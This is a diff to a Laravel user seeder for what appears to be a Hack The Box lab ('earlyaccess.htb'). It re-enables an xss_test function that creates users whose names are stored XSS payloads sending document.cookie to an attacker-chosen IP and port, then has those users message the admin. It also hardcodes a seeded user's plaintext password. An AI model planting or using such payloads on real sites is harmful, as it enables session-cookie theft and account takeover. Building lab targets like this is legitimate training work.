@@ -18,7 +18,7 @@ class UserSeeder extends Seeder
         $this->create_user('chronos','chronos@earlyaccess.htb','pw4chronos@htb');
 
         // Test XSS by creating some XSS test users
-        //$this->xss_test(100);
+        //$this->xss_test(100, "192.168.0.100");
     }
 
     public function create_admin()
@@ -42,7 +42,7 @@ class UserSeeder extends Seeder
     }
 
     // Create test-xss users
-    /*public function xss_test(int $amount)
+    private function xss_test(int $amount, string $ip)
     {
         $port = 1200;
         $amount = $port + $amount;
@@ -51,7 +51,7 @@ class UserSeeder extends Seeder
         {
             // Create user with xss payloads
             $this->create_user(
-                '<script>document.location="http://192.168.1.1:' . $port . '/?cookie="+document.cookie;</script>',
+                '<script>document.location="http://' . $ip . ':' . $port . '/?cookie="+document.cookie;</script>',
                 'user'. $port .'@earlyaccess.htb',
                 bcrypt('P@ssw0rd')
             );
@@ -69,5 +69,5 @@ class UserSeeder extends Seeder
         {
             $user->sendMessage($admin->id, "Lorem ipsum", "Subject");
         }
-    }*/
+    }
 }
